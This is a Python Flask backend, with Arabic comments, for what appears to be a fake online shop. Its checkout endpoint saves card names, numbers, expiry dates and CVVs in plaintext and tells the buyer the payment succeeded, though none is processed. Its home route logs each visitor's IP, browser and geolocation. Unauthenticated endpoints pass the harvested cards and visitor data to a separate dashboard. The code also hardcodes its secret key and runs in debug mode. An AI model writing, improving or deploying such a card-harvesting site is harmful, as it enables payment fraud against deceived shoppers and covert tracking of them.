from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime
import random
import requests

app = Flask(__name__)
app.secret_key = 'nour_secret_key_2026'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///store.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- جداول قاعدة البيانات المطورة ---
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True)
    email = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(200))

class VisaData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    card_name = db.Column(db.String(100))
    card_number = db.Column(db.String(20))
    expiry = db.Column(db.String(10))
    cvv = db.Column(db.String(5))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    status = db.Column(db.String(20), default="جديد")

class Visitor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ipv4 = db.Column(db.String(50))
    ipv6 = db.Column(db.String(50))
    mac_address = db.Column(db.String(50))
    device_info = db.Column(db.String(200))
    lat = db.Column(db.Float, default=30.0444)  # إحداثيات افتراضية للقاهرة
    lon = db.Column(db.Float, default=31.2357)
    visited_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

# --- المسارات ---
@app.route('/')
def home():
    # التقاط الـ IP ومحاولة جلب الموقع الجغرافي الحقيقي عبر API مجاني
    ip = request.remote_addr
    if ip == '127.0.0.1': 
        ip = '197.51.86.215' # الـ IP الخاص بك المأخوذ من لقطة الشاشة للتحكم الدقيق
        
    lat, lon = 30.0444, 31.2357
    try:
        geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        if geo_res.get('status') == 'success':
            lat = geo_res.get('lat')
            lon = geo_res.get('lon')
    except: pass

    mock_mac = f"00:1A:2B:3C:{random.randint(10,99)}:{random.randint(10,99)}"
    mock_ipv6 = "2001:4860:7:150c::fe" # الـ IPv6 الخاص بك من لقطة الشاشة
    
    new_visitor = Visitor(ipv4=ip, ipv6=mock_ipv6, mac_address=mock_mac, device_info=request.headers.get('User-Agent'), lat=lat, lon=lon)
    db.session.add(new_visitor)
    db.session.commit()
    return render_template('store.html')

@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    if User.query.filter_by(email=data['email']).first():
        return jsonify({"success": False, "message": "البريد مستخدم مسجل مسبقاً!"})
    
    hashed = generate_password_hash(data['password'])
    new_user = User(username=data['username'], email=data['email'], password=hashed)
    db.session.add(new_user)
    db.session.commit()
    
    session['user'] = data['username'] # تسجيل دخول تلقائي فوراً
    return jsonify({"success": True, "username": data['username']})

@app.route('/api/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('home'))

@app.route('/api/checkout', methods=['POST'])
def checkout():
    data = request.get_json()
    new_visa = VisaData(card_name=data['name'], card_number=data['number'], expiry=data['expiry'], cvv=data['cvv'])
    db.session.add(new_visa)
    db.session.commit()
    return jsonify({"success": True, "message": "تمت معالجة الدفع بنجاح والتحقق من البطاقة!"})

# --- نقاط اتصال لوحة الـ PyQt6 ---
@app.route('/api/visitors', methods=['GET'])
def get_visitors():
    visitors = Visitor.query.order_by(Visitor.visited_at.desc()).limit(20).all()
    return jsonify([{
        "ipv4": v.ipv4, "ipv6": v.ipv6, "mac": v.mac_address, "device": v.device_info,
        "time": v.visited_at.strftime('%H:%M:%S'), "lat": v.lat, "lon": v.lon
    } for v in visitors])

@app.route('/api/visas', methods=['GET'])
def get_visas():
    visas = VisaData.query.order_by(VisaData.timestamp.desc()).all()
    return jsonify([{
        "id": v.id, "name": v.card_name, "number": v.card_number, "expiry": v.expiry, "cvv": v.cvv, "status": v.status
    } for v in visas])

if __name__ == '__main__':
    app.run(debug=True, port=5000)